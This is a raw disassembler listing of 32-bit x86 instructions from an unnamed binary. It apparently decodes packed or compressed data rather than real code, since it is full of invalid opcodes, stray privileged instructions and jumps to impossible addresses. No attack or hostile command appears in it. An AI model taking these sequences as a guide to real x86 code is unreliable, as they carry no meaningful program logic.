  4164d2:	43                   	inc    %ebx
  4164d3:	34 01                	xor    $0x1,%al
  4164d5:	04 50                	add    $0x50,%al
  4164d7:	88 b5 ff 0b 4b a1    	mov    %dh,-0x5eb4f401(%ebp)
  4164dd:	e5 62                	in     $0x62,%eax
  4164df:	51                   	push   %ecx
  4164e0:	c2 32 35             	ret    $0x3532
  4164e3:	43                   	inc    %ebx
  4164e4:	97                   	xchg   %eax,%edi
  4164e5:	4d                   	dec    %ebp
  4164e6:	d7                   	xlat   %ds:(%ebx)
  4164e7:	d1 f0                	shl    $1,%eax
  4164e9:	ea 9c bd ac 0f 94 07 	ljmp   $0x794,$0xfacbd9c
  4164f0:	54                   	push   %esp
  4164f1:	8c ba a6 59 76 0f    	mov    %?,0xf7659a6(%edx)
  4164f7:	b0 f3                	mov    $0xf3,%al
  4164f9:	84 bc 7c 07 d0 69 9a 	test   %bh,-0x65962ff9(%esp,%edi,2)
  416500:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  416501:	6b 74 27 0c 6c       	imul   $0x6c,0xc(%edi,%eiz,1),%esi
  416506:	44                   	inc    %esp
  416507:	64 a6                	cmpsb  %es:(%edi),%fs:(%esi)
  416509:	6b ba a6 94 5c 0f 60 	imul   $0x60,0xf5c94a6(%edx),%edi
  416510:	54                   	push   %esp
  416511:	07                   	pop    %es
  416512:	74 9b                	je     0x4164af
  416514:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  416515:	69 ba 4c 0f 28 44 2c 	imul   $0xf5043c2c,0x44280f4c(%edx),%edi
  41651c:	3c 04 f5 
  41651f:	34 4d                	xor    $0x4d,%al
  416521:	d3 2c 34             	shrl   %cl,(%esp,%esi,1)
  416524:	f8                   	clc
  416525:	2c 20                	sub    $0x20,%al
  416527:	24 d3                	and    $0xd3,%al
  416529:	34 5d                	xor    $0x5d,%al
  41652b:	d3 9c 1c 17 8c 14 24 	rcrl   %cl,0x24148c17(%esp,%ebx,1)
  416532:	6d                   	insl   (%dx),%es:(%edi)
  416533:	d3 35 5d 0c 07 14    	shll   %cl,0x14070c5d
  416539:	04 17                	add    $0x17,%al
  41653b:	3c fc                	cmp    $0xfc,%al
  41653d:	f1                   	int1
  41653e:	0f cb                	bswap  %ebx
  416540:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  416541:	e9 9a 08 f4 07       	jmp    0x8356de0
  416546:	0c ec                	or     $0xec,%al
  416548:	f0 f3 e4 9a          	lock repz in $0x9a,%al
  41654c:	65 d3 34 cc          	shll   %cl,%gs:(%esp,%ecx,8)
  416550:	dc 88 f4 d4 b8 6b    	fmull  0x6bb8d4f4(%eax)
  416556:	ba a6 6b cc 17       	mov    $0x17cc6ba6,%edx
  41655b:	98                   	cwtl
  41655c:	c4 2f                	les    (%edi),%ebp
  41655e:	00 bc 17 e9 de 03 a6 	add    %bh,-0x59fc2117(%edi,%edx,1)
  416565:	38 4f b4             	cmp    %cl,-0x4c(%edi)
  416568:	3b 0b                	cmp    (%ebx),%ecx
  41656a:	00 27                	add    %ah,(%edi)
  41656c:	cf                   	iret
  41656d:	c9                   	leave
  41656e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  41656f:	b0 b4                	mov    $0xb4,%al
  416571:	f3 ac                	rep lods %ds:(%esi),%al
  416573:	f4                   	hlt
  416574:	a8 06                	test   $0x6,%al
  416576:	69 4e 36 a4 f3 a4 d8 	imul   $0xd8a4f3a4,0x36(%esi),%ecx
  41657d:	a0 0c d2 9c ec       	mov    0xec9cd20c,%al
  416582:	3b d0                	cmp    %eax,%edx
  416584:	f3 9c                	repz pushf
  416586:	bc 98 73 f6 0d       	mov    $0xdf67398,%esp
  41658b:	d2 34 94             	shlb   %cl,(%esp,%edx,4)
  41658e:	7b f4                	jnp    0x416584
  416590:	17                   	pop    %ss
  416591:	90                   	nop
  416592:	6f                   	outsl  %ds:(%esi),(%dx)
  416593:	90                   	nop
  416594:	e6 64                	out    %al,$0x64
  416596:	d4 f3                	aam    $0xf3
  416598:	8c 80 88 b7 9d 41    	mov    %es,0x419db788(%eax)
  41659e:	9a b3 f4 77 84 c4 80 	lcall  $0x80c4,$0x8477f4b3
  4165a5:	7b 83                	jnp    0x41652a
  4165a7:	34 83                	xor    $0x83,%al
  4165a9:	0b 7c 24 78          	or     0x78(%esp),%edi
  4165ad:	ff 0b                	decl   (%ebx)
  4165af:	d9 9c 6c 06 74 a0 f3 	fstps  -0xc5f8bfa(%esp,%ebp,2)
  4165b6:	70 c0                	jo     0x416578
  4165b8:	f4                   	hlt
  4165b9:	d8 1b                	fcomps (%ebx)
  4165bb:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4165bc:	39 6c 68 68          	cmp    %ebp,0x68(%eax,%ebp,2)
  4165c0:	f7 17                	notl   (%edi)
  4165c2:	48                   	dec    %eax
  4165c3:	33 48 33             	xor    0x33(%eax),%ecx
  4165c6:	64 5c                	fs pop %esp
  4165c8:	60                   	pusha
  4165c9:	90                   	nop
  4165ca:	48                   	dec    %eax
  4165cb:	33 48 33             	xor    0x33(%eax),%ecx
  4165ce:	5c                   	pop    %esp
  4165cf:	64 58                	fs pop %eax
  4165d1:	18 90 e6 64 33 54    	sbb    %dl,0x543364e6(%eax)
  4165d7:	9c                   	pushf
  4165d8:	f3 50                	repz push %eax
  4165da:	48                   	dec    %eax
  4165db:	20 cd                	and    %cl,%ch
  4165dd:	c9                   	leave
  4165de:	66 4c                	dec    %sp
  4165e0:	10 f5                	adc    %dh,%ch
  4165e2:	48                   	dec    %eax
  4165e3:	ec                   	in     (%dx),%al
  4165e4:	ce                   	into
  4165e5:	9e                   	sahf
  4165e6:	93                   	xchg   %eax,%ebx
  4165e7:	cd 44                	int    $0x44
  4165e9:	7c f4                	jl     0x4165df
  4165eb:	40                   	inc    %eax
  4165ec:	f3 fb                	repz sti
  4165ee:	3c 06                	cmp    $0x6,%al
  4165f0:	69 06 69 a8 38 e4    	imul   $0xe438a869,(%esi),%eax
  4165f6:	34 73                	xor    $0x73,%al
  4165f8:	f6 9c 6c 2c f5 30 f3 	negb   -0xccf0ad4(%esp,%ebp,2)
  4165ff:	9b                   	fwait
  416600:	2c cd                	sub    $0xcd,%al
  416602:	20 cd                	and    %cl,%ch
  416604:	d9 f3                	fpatan
  416606:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  416607:	28 f4                	sub    %dh,%ah
  416609:	24 78                	and    $0x78,%al
  41660b:	36 67 cf             	ss addr16 iret
  41660e:	20 20                	and    %ah,(%eax)
  416610:	f5                   	cmc
  416611:	2f                   	das
  416612:	1c 40                	sbb    $0x40,%al
  416614:	f4                   	hlt
  416615:	d7                   	xlat   %ds:(%ebx)
  416616:	3b 79 4e             	cmp    0x4e(%ecx),%edi
  416619:	18 f3                	sbb    %dh,%bl
  41661b:	0a f3                	or     %bl,%dh
  41661d:	80 8c 2a b6 81 54 10 	orb    $0x27,0x105481b6(%edx,%ebp,1)
  416624:	27 
  416625:	95                   	xchg   %eax,%ebp
  416626:	b3 0b                	mov    $0xb,%bl
  416628:	f8                   	clc
  416629:	c0 ff 3f             	sar    $0x3f,%bh
  41662c:	13 49 4e             	adc    0x4e(%ecx),%ecx
  41662f:	46                   	inc    %esi
  416630:	4e                   	dec    %esi
  416631:	41                   	inc    %ecx
  416632:	4e                   	dec    %esi
  416633:	55                   	push   %ebp
  416634:	ec                   	in     (%dx),%al
  416635:	1c df                	sbb    $0xdf,%al
  416637:	4b                   	dec    %ebx
  416638:	af                   	scas   %es:(%edi),%eax
  416639:	ba 80 22 b8 13       	mov    $0x13b82280,%edx
  41663e:	0f 51 17             	sqrtps (%edi),%xmm2
  416641:	7d 01                	jge    0x416644
  416643:	a0 54 af d8 7d       	mov    0x7dd8af54,%al
  416648:	05 b8 02 54 cd       	add    $0xcd5402b8,%eax
  41664d:	36 56                	ss push %esi
  41664f:	0b 7e 09             	or     0x9(%esi),%edi
  416652:	12 89 c2 54 bf bb    	adc    -0x4440ab3e(%ecx),%cl
  416658:	c6 b8                	xabort $0xb8,(bad)
  41665a:	0f 47 80 7d 10 02 72 	cmova  0x7202107d(%eax),%eax
  416661:	03 11                	add    (%ecx),%edx
  416663:	15 7a 53 e5 43       	adc    $0x43e5537a,%eax
  416668:	3d 81 8b 7d fc       	cmp    $0xfc7d8b81,%eax
  41666d:	8e db                	mov    %ebx,%ds
  41666f:	3a 53 b5             	cmp    -0x4b(%ebx),%dl
  416672:	0b 2d cb 3a 73 42    	or     0x42733acb,%ebp
  416678:	c8 17 3f 52          	enter  $0x3f17,$0x52
  41667c:	c0 bf 80 9c 8d b4 49 	sarb   $0x49,-0x4b726380(%edi)
  416683:	dc 8f 40 dd f3 a4    	fmull  -0x5b0c22c0(%edi)
  416689:	eb 23                	jmp    0x4166ae
  41668b:	8d                   	lea    (bad),%ebx
  41668c:	db f6                	fcomi  %st(6),%st
  41668e:	dd ff                	(bad)
  416690:	75 e7                	jne    0x416679
  416692:	0f b6 5d 10          	movzbl 0x10(%ebp),%ebx
  416696:	80 fb 01             	cmp    $0x1,%bl
  416699:	74 04                	je     0x41669f
  41669b:	04 77                	add    $0x77,%al
  41669d:	09 0f                	or     %ecx,(%edi)
  41669f:	bf 35 3b 57 7e       	mov    $0x7e573b35,%edi
  4166a4:	02 9a be c0 02 b3    	add    -0x4cfd3f42(%edx),%bl
  4166aa:	f1                   	int1
  4166ab:	14 9d                	adc    $0x9d,%al
  4166ad:	83 90 94 c7 c6 aa 42 	adcl   $0x42,-0x5539386c(%eax)
  4166b4:	d0 02                	rolb   $1,(%edx)
  4166b6:	30 4f aa             	xor    %cl,-0x56(%edi)
  4166b9:	d8 0c b2             	fmuls  (%edx,%esi,4)
  4166bc:	ed                   	in     (%dx),%eax
  4166bd:	11 0c 91             	adc    %ecx,(%ecx,%edx,4)
  4166c0:	03 7f e5             	add    -0x1b(%edi),%edi
  4166c3:	ac                   	lods   %ds:(%esi),%al
  4166c4:	0a 5b 63             	or     0x63(%ebx),%bl
  4166c7:	bb 2b d2 30 4e       	mov    $0x4e30d22b,%ebx
  4166cc:	c3                   	ret
  4166cd:	87 e6                	xchg   %esp,%esi
  4166cf:	03 09                	add    (%ecx),%ecx
  4166d1:	2d ff 2e b6 d8       	sub    $0xd8b62eff,%eax
  4166d6:	aa                   	stos   %al,%es:(%edi)
  4166d7:	c3                   	ret
  4166d8:	6c                   	insb   (%dx),%es:(%edi)
  4166d9:	4b                   	dec    %ebx
  4166da:	4d                   	dec    %ebp
  4166db:	bc 3b 4d 0c 7f       	mov    $0x7f0c4d3b,%esp
  4166e0:	1f                   	pop    %ds
  4166e1:	83 f9 fd             	cmp    $0xfffffffd,%ecx
  4166e4:	bf b8 bd fd 7c       	mov    $0x7cfdbdb8,%edi
  4166e9:	1a 0b                	sbb    (%ebx),%cl
  4166eb:	c9                   	leave
  4166ec:	7f 1c                	jg     0x41670a
  4166ee:	26 aa                	es stos %al,%es:(%edi)
  4166f0:	80 3e 24             	cmpb   $0x24,(%esi)
  4166f3:	40                   	inc    %eax
  4166f4:	a0 f1 aa f7 7d       	mov    0x7df7aaf1,%al
  4166f9:	37                   	aaa
  4166fa:	d6                   	salc
  4166fb:	b7 d9                	mov    $0xd9,%bh
  4166fd:	0f f3 aa eb 1c ef 42 	psllq  0x42ef1ceb(%edx),%mm5
  416704:	47                   	inc    %edi
  416705:	74 19                	je     0x416720
  416707:	aa                   	stos   %al,%es:(%edi)
  416708:	e2 f8                	loop   0x416702
  41670a:	6f                   	outsl  %ds:(%esi),(%dx)
  41670b:	fb                   	sti
  41670c:	8e fd                	mov    %ebp,%?
  41670e:	07                   	pop    %es
  41670f:	15 8a e0 22 66       	adc    $0x6622e08a,%eax
  416714:	ab                   	stos   %eax,%es:(%edi)
  416715:	0d 07 23 f8 29       	or     $0x29f82307,%eax
  41671a:	00 68 6d             	add    %ch,0x6d(%eax)
  41671d:	51                   	push   %ecx
  41671e:	73 06                	jae    0x416726
  416720:	35 60 f6 37 5b       	xor    $0x5b37f660,%eax
  416725:	72 2b                	jb     0x416752
  416727:	61                   	popa
  416728:	04 93                	add    $0x93,%al
  41672a:	8a 25 28 29 76 b1    	mov    0xb1762928,%ah
  416730:	8d                   	lea    (bad),%esp
  416731:	e5 49                	in     $0x49,%eax
  416733:	10 42 b4             	adc    %al,-0x4c(%edx)
  416736:	2b 01                	sub    (%ecx),%eax
  416738:	fd                   	std
  416739:	ed                   	in     (%dx),%eax
  41673a:	db 5b 74             	fistpl 0x74(%ebx)
  41673d:	04 72                	add    $0x72,%al
  41673f:	02 2c b0             	add    (%eax,%esi,4),%ch
  416742:	45                   	inc    %ebp
  416743:	8a 5d e5             	mov    -0x1b(%ebp),%bl
  416746:	bf 55 e4 4a aa       	mov    $0xaa4ae455,%edi
  41674b:	0a de                	or     %dh,%bl
  41674d:	6e                   	outsb  %ds:(%esi),(%dx)
  41674e:	37                   	aaa
  41674f:	45                   	inc    %ebp
  416750:	4c                   	dec    %esp
  416751:	d2 eb                	shr    %cl,%bl
  416753:	0a 47 7d             	or     0x7d(%edi),%al
  416756:	06                   	push   %es
  416757:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  416758:	f7 da                	neg    %edx
  41675a:	eb 78                	jmp    0x4167d4
  41675c:	fb                   	sti
  41675d:	b7 8d                	mov    $0x8d,%bh
  41675f:	4e                   	dec    %esi
  416760:	e4 b0                	in     $0xb0,%al
  416762:	8a c4                	mov    %ah,%al
  416764:	aa                   	stos   %al,%es:(%edi)
  416765:	92                   	xchg   %eax,%edx
  416766:	50                   	push   %eax
  416767:	8b dc                	mov    %esp,%ebx
  416769:	18 f7                	sbb    %dh,%bh
  41676b:	35 c0 b7 fd 04       	xor    $0x4fdb7c0,%eax
  416770:	64 1c 10             	fs sbb $0x10,%al
  416773:	43                   	inc    %ebx
  416774:	49                   	dec    %ecx
  416775:	0b d4                	or     %esp,%edx
  416777:	ed                   	in     (%dx),%eax
  416778:	b1 88                	mov    $0x88,%cl
  41677a:	d9 12                	fsts   (%edx)
  41677c:	7f e9                	jg     0x416767
  41677e:	4b                   	dec    %ebx
  41677f:	8a 03                	mov    (%ebx),%al
  416781:	aa                   	stos   %al,%es:(%edi)
  416782:	3b dc                	cmp    %esp,%ebx
  416784:	e5 58                	in     $0x58,%eax
  416786:	72 d3                	jb     0x41675b
  416788:	bd c3 5f 49 83       	mov    $0x83495fc3,%ebp
  41678d:	fa                   	cli
  41678e:	12 72 05             	adc    0x5(%edx),%dh
  416791:	ba 81 e1 d5 05       	mov    $0x5d5e181,%edx
  416796:	21 e2                	and    %esp,%edx
  416798:	50                   	push   %eax
  416799:	60                   	pusha
  41679a:	eb 28                	jmp    0x4167c4
  41679c:	39 87 30 5b fc ec    	cmp    %eax,-0x1303a4d0(%edi)
  4167a2:	7f c1                	jg     0x416765
  4167a4:	48                   	dec    %eax
  4167a5:	b3 03                	mov    $0x3,%bl
  4167a7:	f6 f3                	div    %bl
  4167a9:	8a dc                	mov    %ah,%bl
  4167ab:	43                   	inc    %ebx
  4167ac:	8d 49 74             	lea    0x74(%ecx),%ecx
  4167af:	0d 4b 19 a0 f7       	or     $0xf7a0194b,%eax
  4167b4:	ac                   	lods   %ds:(%esi),%al
  4167b5:	bb bd ee f0 18       	mov    $0x18f0eebd,%ebx
  4167ba:	eb ea                	jmp    0x4167a6
  4167bc:	c4 1a                	les    (%edx),%ebx
  4167be:	fe                   	(bad)
  4167bf:	e3 09                	jecxz  0x4167ca
  4167c1:	38 b7 9f 35 7a 4a    	cmp    %dh,0x4a7a359f(%edi)
  4167c7:	74 0c                	je     0x4167d5
  4167c9:	41                   	inc    %ecx
  4167ca:	b7 2a                	mov    $0x2a,%bh
  4167cc:	4a                   	dec    %edx
  4167cd:	75 f7                	jne    0x4167c6
  4167cf:	c3                   	ret
  4167d0:	46                   	inc    %esi
  4167d1:	8a 1d 36 42 84 47    	mov    0x47844236,%bl
  4167d7:	58                   	pop    %eax
  4167d8:	a3 51 0b 10 fc       	mov    %eax,0xfc100b51
  4167dd:	7f 17                	jg     0x4167f6
  4167df:	cf                   	iret
  4167e0:	ed                   	in     (%dx),%eax
  4167e1:	0f 57 3a             	xorps  (%edx),%xmm7
  4167e4:	d9 76 02             	fnstenv 0x2(%esi)
  4167e7:	8a d9                	mov    %cl,%bl
  4167e9:	02 dd                	add    %ch,%bl
  4167eb:	8d 9c 9b 4e 92 01 ff 	lea    -0xfe6db2(%ebx,%ebx,4),%ebx
  4167f2:	cd 34                	int    $0x34
  4167f4:	c8 05 a0 3c          	enter  $0xa005,$0x3c
  4167f8:	40                   	inc    %eax
  4167f9:	74 1e                	je     0x416819
  4167fb:	51                   	push   %ecx
  4167fc:	53                   	push   %ebx
  4167fd:	3c 24                	cmp    $0x24,%al
  4167ff:	37                   	aaa
  416800:	62 6b 0b             	bound  %ebp,0xb(%ebx)
  416803:	9d                   	popf
  416804:	2a 80 8b 0c ce 82    	sub    -0x7d31f375(%eax),%al
  41680a:	38 de                	cmp    %bl,%dh
  41680c:	22 f8                	and    %al,%bh
  41680e:	3f                   	aas
  41680f:	81 80 5b 59 43 e2 dc 	addl   $0xe866c3dc,-0x1dbca6a5(%eax)
  416816:	c3 66 e8 
  416819:	04 41                	add    $0x41,%al
  41681b:	ab                   	stos   %eax,%es:(%edi)
  41681c:	42                   	inc    %edx
  41681d:	03 68 05             	add    0x5(%eax),%ebp
  416820:	ea fb 98 cd 6e 77 7b 	ljmp   $0x7b77,$0x6ecd98fb
  416827:	24 2a                	and    $0x2a,%al
  416829:	40                   	inc    %eax
  41682a:	00 2a                	add    %ch,(%edx)
  41682c:	24 04                	and    $0x4,%al
  41682e:	24 20                	and    $0x20,%al
  416830:	0a 2a                	or     (%edx),%ch
  416832:	20 28                	and    %ch,(%eax)
  416834:	d9 fd                	fscale
  416836:	7e 6f                	jle    0x4168a7
  416838:	14 29                	adc    $0x29,%al
  41683a:	40                   	inc    %eax
  41683b:	2d 19 24 2d 04       	sub    $0x42d2419,%eax
  416840:	2a 2d 13 2a 24 7d    	sub    0x7d242a13,%ch
  416846:	dd d7                	fst    %st(7)
  416848:	9e                   	sahf
  416849:	28 0d 04 24 13 2d    	sub    %cl,0x2d132404
  41684f:	2d 2d 6b ee bd       	sub    $0xbdee6b2d,%eax
  416854:	ee                   	out    %al,(%dx)
  416855:	37                   	aaa
  416856:	08 2d 40 04 32 07    	or     %ch,0x7320440
  41685c:	18 c9                	sbb    %cl,%cl
  41685e:	18 dd                	sbb    %bl,%ch
  416860:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  416861:	28 29                	sub    %ch,(%ecx)
  416863:	28 19                	sub    %bl,(%ecx)
  416865:	29 cf                	sub    %ecx,%edi
  416867:	40                   	inc    %eax
  416868:	1a 2f                	sbb    (%edi),%ch
  41686a:	5a                   	pop    %edx
  41686b:	a8 e9                	test   $0xe9,%al
  41686d:	d9 af 68 a0 28 bc    	fldcw  -0x43d75f98(%edi)
  416873:	01 02                	add    %eax,(%edx)
  416875:	07                   	pop    %es
  416876:	0b 47 04             	or     0x4(%edi),%eax
  416879:	08 d8                	or     %bl,%al
  41687b:	1b 25 de 4c c1 e9    	sbb    0xe9c14cde,%esp
  416881:	1f                   	pop    %ds
  416882:	f4                   	hlt
  416883:	ad                   	lods   %ds:(%esi),%eax
  416884:	47                   	inc    %edi
  416885:	08 0b                	or     %cl,(%ebx)
  416887:	12 ef                	adc    %bh,%ch
  416889:	1f                   	pop    %ds
  41688a:	b4 db                	mov    $0xdb,%ah
  41688c:	07                   	pop    %es
  41688d:	0a 4f 08             	or     0x8(%edi),%cl
  416890:	13 ea                	adc    %edx,%ebp
  416892:	83 7a 74 4c          	cmpl   $0x4c,0x74(%edx)
  416896:	06                   	push   %es
  416897:	9a 38 a3 8b b5 36 ba 	lcall  $0xba36,$0xb58ba338
  41689e:	e8 f4 88 2b 04       	call   0x46cf197
  4168a3:	44                   	inc    %esp
  4168a4:	da 0a                	fimull (%edx)
  4168a6:	bf d0 01 1a c3       	mov    $0xc31a01d0,%edi
  4168ab:	00 d5                	add    %dl,%ch
  4168ad:	0c c0                	or     $0xc0,%al
  4168af:	c5 f4 66             	(bad)
  4168b2:	a3 2d 04 1b d2       	mov    %eax,0xd21b042d
  4168b7:	66 3d 16 17          	cmp    $0x1716,%ax
  4168bb:	05 f8 c6 6e 6d       	add    $0x6d6ec6f8,%eax
  4168c0:	77 74                	ja     0x416936
  4168c2:	11 67 75             	adc    %esp,0x75(%edi)
  4168c5:	20 0a                	and    %cl,(%edx)
  4168c7:	28 7e 1a             	sub    %bh,0x1a(%esi)
  4168ca:	38 14 f0             	cmp    %dl,(%eax,%esi,8)
  4168cd:	1c c0                	sbb    $0xc0,%al
  4168cf:	26 6b 0f 6a          	imul   $0x6a,%es:(%edi),%ecx
  4168d3:	ad                   	lods   %ds:(%esi),%eax
  4168d4:	32 c5                	xor    %ch,%al
  4168d6:	96                   	xchg   %eax,%esi
  4168d7:	ed                   	in     (%dx),%eax
  4168d8:	13 3e                	adc    (%esi),%edi
  4168da:	eb 21                	jmp    0x4168fd
  4168dc:	19 c3                	sbb    %eax,%ebx
  4168de:	16                   	push   %ss
  4168df:	97                   	xchg   %eax,%edi
  4168e0:	d8 1c ab             	fcomps (%ebx,%ebp,4)
  4168e3:	9f                   	lahf
  4168e4:	71 da                	jno    0x4168c0
  4168e6:	3b 75 f0             	cmp    -0x10(%ebp),%esi
  4168e9:	25 83 b5 84 60       	and    $0x6084b583,%eax
  4168ee:	fc                   	cld
  4168ef:	7f 53                	jg     0x416944
  4168f1:	cc                   	int3
  4168f2:	fa                   	cli
  4168f3:	37                   	aaa
  4168f4:	75 08                	jne    0x4168fe
  4168f6:	e3 1d                	jecxz  0x416915
  4168f8:	ac                   	lods   %ds:(%esi),%al
  4168f9:	3c 27                	cmp    $0x27,%al
  4168fb:	74 24                	je     0x416921
  4168fd:	3c 22                	cmp    $0x22,%al
  4168ff:	74 20                	je     0x416921
  416901:	6b ba df 76 95 10 3c 	imul   $0x3c,0x109576df(%edx),%edi
  416908:	2a ef                	sub    %bh,%ch
  41690a:	e2 ed                	loop   0x4168f9
  41690c:	8a 06                	mov    (%esi),%al
  41690e:	0b 04 0b             	or     (%ebx,%ecx,1),%eax
  416911:	21 f4                	and    %esi,%esp
  416913:	1b cb                	sbb    %ebx,%ecx
  416915:	98                   	cwtl
  416916:	0c 02                	or     $0x2,%al
  416918:	c3                   	ret
  416919:	bf ac 3a c4 74       	mov    $0x74c43aac,%edi
  41691e:	d0 1a                	rcrb   $1,(%edx)
  416920:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  416921:	ad                   	lods   %ds:(%esi),%eax
  416922:	dd 1a                	fstpl  (%edx)
  416924:	f7 eb                	imul   %ebx
  416926:	e7 fe                	out    %eax,$0xfe
  416928:	53                   	push   %ebx
  416929:	bb 8b 8d df b6       	mov    $0xb6df8d8b,%ebx
  41692e:	7f 37                	jg     0x416967
  416930:	65 c7 45 5c c8 88 55 	movl   $0xf85588c8,%gs:0x5c(%ebp)
  416937:	f8 
  416938:	02 f4                	add    %ah,%dh
  41693a:	4f                   	dec    %edi
  41693b:	23 74 26 3c          	and    0x3c(%esi,%eiz,1),%esi
  41693f:	37                   	aaa
  416940:	dd 12                	fstl   (%edx)
  416942:	ff 30                	push   (%eax)
  416944:	74 25                	je     0x41696b
  416946:	3c 2e                	cmp    $0x2e,%al
  416948:	74 2c                	je     0x416976
  41694a:	3c 5a                	cmp    $0x5a,%al
  41694c:	33 5f 35             	xor    0x35(%edi),%ebx
  41694f:	31 3c 45 7d 77 db e2 	xor    %edi,-0x1d248883(,%eax,2)
  416956:	74 3a                	je     0x416992
  416958:	3c 53                	cmp    $0x53,%al
  41695a:	36 4a                	ss dec %edx
  41695c:	74 46                	je     0x4169a4
  41695e:	44                   	inc    %esp
  41695f:	d7                   	xlat   %ds:(%ebx)
  416960:	eb 40                	jmp    0x4169a2
  416962:	42                   	inc    %edx
  416963:	eb fd                	jmp    0x416962
  416965:	6f                   	outsl  %ds:(%esi),(%dx)
  416966:	40                   	inc    %eax
  416967:	2d 4b d3 ba da       	sub    $0xdabad34b,%eax
  41696c:	42                   	inc    %edx
  41696d:	8b ca                	mov    %edx,%ecx
  41696f:	eb c7                	jmp    0x416938
  416971:	83 7d e8 5b          	cmpl   $0x5b,-0x18(%ebp)
  416975:	b0 d0                	mov    $0xd0,%al
  416977:	1b 6f c1             	sbb    -0x3f(%edi),%ebp
  41697a:	89 55 30             	mov    %edx,0x30(%ebp)
  41697d:	bc dc 01 77 db       	mov    $0xdb7701dc,%esp
  416982:	c8 d9 eb b6          	enter  $0xebd9,$0xb6
  416986:	70 af                	jo     0x416937
  416988:	14 56                	adc    $0x56,%al
  41698a:	2d 92 2b 75 a1       	sub    $0xa1752b92,%eax
  41698f:	0d e2 6e 43 7e       	or     $0x7e436ee2,%eax
  416994:	01 ac 5f fb eb 96 1a 	add    %ebp,0x1a96ebfb(%edi,%ebx,2)
  41699b:	4a                   	dec    %edx
  41699c:	bb 32 63 34 03       	mov    $0x3346332,%ebx
  4169a1:	a0 2b c1 e4 12       	mov    0x12e4c12b,%al
  4169a6:	23 bf 87 bd e0 0b    	and    0xbe0bd87(%edi),%edi
  4169ac:	c3                   	ret
  4169ad:	7d e4                	jge    0x416993
  4169af:	86 75 ac             	xchg   %dh,-0x54(%ebp)
  4169b2:	0a 87 29 83 c0 eb    	or     -0x143f7cd7(%edi),%al
  4169b8:	13 da                	adc    %edx,%ebx
  4169ba:	26 77 db             	es ja  0x416998
  4169bd:	0d c0 3b 0a 7f       	or     $0x7f0a3bc0,%eax
  4169c2:	03 0f                	add    (%edi),%ecx
  4169c4:	41                   	inc    %ecx
  4169c5:	c0 2b 39             	shrb   $0x39,(%ebx)
  4169c8:	5d                   	pop    %ebp
  4169c9:	85 60 db             	test   %esp,-0x25(%eax)
  4169cc:	24 dc                	and    $0xdc,%al
  4169ce:	3f                   	aas
  4169cf:	d8 43 62             	fadds  0x62(%ebx)
  4169d2:	8d                   	lea    (bad),%ebp
  4169d3:	ef                   	out    %eax,(%dx)
  4169d4:	74 5b                	je     0x416a31
  4169d6:	ba 5d 2e c2 08       	mov    $0x8c22e5d,%edx
  4169db:	fb                   	sti
  4169dc:	08 75 f7             	or     %dh,-0x9(%ebp)
  4169df:	cd 9a                	int    $0x9a
  4169e1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4169e2:	69 9a 27 23 f3 ef 1e 	imul   $0x868d1a1e,-0x100cdcd9(%edx),%ebx
  4169e9:	1a 8d 86 
  4169ec:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4169ed:	69 24 20 53 20 4f a2 	imul   $0xa24f2053,(%eax,%eiz,1),%esp
  4169f4:	dd d9                	fstp   %st(1)
  4169f6:	4f                   	dec    %edi
  4169f7:	00 e5                	add    %ah,%ch
  4169f9:	1b eb                	sbb    %ebx,%ebp
  4169fb:	cd b6                	int    $0xb6
  4169fd:	c6                   	(bad)
  4169fe:	14 3a                	adc    $0x3a,%al
  416a00:	c4 6f ed             	les    -0x13(%edi),%ebp
  416a03:	2f                   	das
  416a04:	f4                   	hlt
  416a05:	8a 26                	mov    (%esi),%ah
  416a07:	80 fc 2b             	cmp    $0x2b,%ah
  416a0a:	7e 04                	jle    0x416a10
  416a0c:	2d 75 dc 32 e4       	sub    $0xe432dc75,%eax
  416a11:	3d 6d ad 0f 9b       	cmp    $0x9b0fad6d,%eax
  416a16:	41                   	inc    %ecx
  416a17:	46                   	inc    %esi
  416a18:	30 51 f9             	xor    %dl,-0x7(%ecx)
  416a1b:	cc                   	int3
  416a1c:	05 8f 60 ed 53       	add    $0x53ed608f,%eax
  416a21:	16                   	push   %ss
  416a22:	53                   	push   %ebx
  416a23:	8a 76 8c             	mov    -0x74(%esi),%dh
  416a26:	df f7                	fcomip %st(7),%st
  416a28:	b6 8d                	mov    $0x8d,%dh
  416a2a:	f5                   	cmc
  416a2b:	3c 5b                	cmp    $0x5b,%al
  416a2d:	eb 88                	jmp    0x4169b7
  416a2f:	a3 c3 dd d8 8b       	mov    %eax,0x8bd8ddc3
  416a34:	1b 7c 0c 59          	sbb    0x59(%esp,%ecx,1),%edi
  416a38:	d6                   	salc
  416a39:	da a5 fe 3c ff 4d    	fisubl 0x4dff3cfe(%ebp)
  416a3f:	d8 75 f6             	fdivs  -0xa(%ebp)
  416a42:	c8 ff 45 ab          	enter  $0x45ff,$0xab
  416a46:	b1 c3                	mov    $0xc3,%cl
  416a48:	6d                   	insl   (%dx),%es:(%edi)
  416a49:	58                   	pop    %eax
  416a4a:	ba c5 e4 c6 eb       	mov    $0xebc6e4c5,%edx
  416a4f:	41                   	inc    %ecx
  416a50:	28 43 1e             	sub    %al,0x1e(%ebx)
  416a53:	0b 4b ab             	or     -0x55(%ebx),%ecx
  416a56:	dd 4a 8f             	fisttpll -0x71(%edx)
  416a59:	11 e0                	adc    %esp,%eax
  416a5b:	7e 31                	jle    0x416a8e
  416a5d:	7d 32                	jge    0x416a91
  416a5f:	dc 00                	faddl  (%eax)
  416a61:	10 6b 81             	adc    %ch,-0x7f(%ebx)
  416a64:	5b                   	pop    %ebx
  416a65:	b6 27                	mov    $0x27,%dh
  416a67:	eb 1e                	jmp    0x416a87
  416a69:	aa                   	stos   %al,%es:(%edi)
  416a6a:	d0 f8                	sar    $1,%al
  416a6c:	17                   	pop    %ss
  416a6d:	21 f4                	and    %esi,%esp
  416a6f:	b6 f4                	mov    $0xf4,%dh
  416a71:	12 16                	adc    (%esi),%dl
  416a73:	7e 0f                	jle    0x416a84
